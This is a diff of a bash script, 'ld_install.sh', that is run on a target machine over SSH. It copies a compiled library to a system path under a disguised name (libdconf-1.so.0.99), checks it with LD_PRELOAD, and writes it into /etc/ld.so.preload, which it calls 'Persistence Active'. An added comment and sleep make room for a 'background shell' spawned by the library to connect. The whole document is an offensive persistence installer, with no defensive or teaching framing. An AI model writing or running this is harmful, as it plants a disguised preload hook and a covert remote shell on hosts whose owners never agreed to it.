@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# To run on target machine after copying the compiled .so to /tmp/libdconf-update.so
+# ld_install.sh - Run on target via SSH pipe
 
 SO_SRC="/tmp/libdconf-update.so"
 SO_DEST="/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99"
@@ -16,21 +16,22 @@ chown root:root "$SO_DEST"
 chmod 644 "$SO_DEST"
 
 # -- SAFETY CHECK --
-# Run /bin/true while preloading library
-# If library is broken, /bin/true will fail, and script stops to avoid bricking box
+# This runs /bin/true with library. If it segfaults, stop before editing preload
 echo "[*] Verifying library integrity..."
 if ! LD_PRELOAD="$SO_DEST" /bin/true; then
     echo "[-] CRITICAL FAILURE: Library is unstable or corrupt!"
     echo "[-] Removing $SO_DEST to prevent system brick."
-    rm "$SO_DEST"
+    rm -f "$SO_DEST"
     exit 1
 fi
 
-# -- Activation -- 
-# (Only reached if safety check passes)
+# -- Activation --
+# If the safety check passes, commit the path to /etc/ld.so.preload
 if ! grep -q "$SO_DEST" /etc/ld.so.preload 2>/dev/null; then
     echo "$SO_DEST" >> /etc/ld.so.preload
     echo "[+] Integrity verified. Persistence Active."
+    # Gives the background shell from the safety check time to connect
+    sleep 2 
 else
     echo "[*] Persistence already exists."
 fi
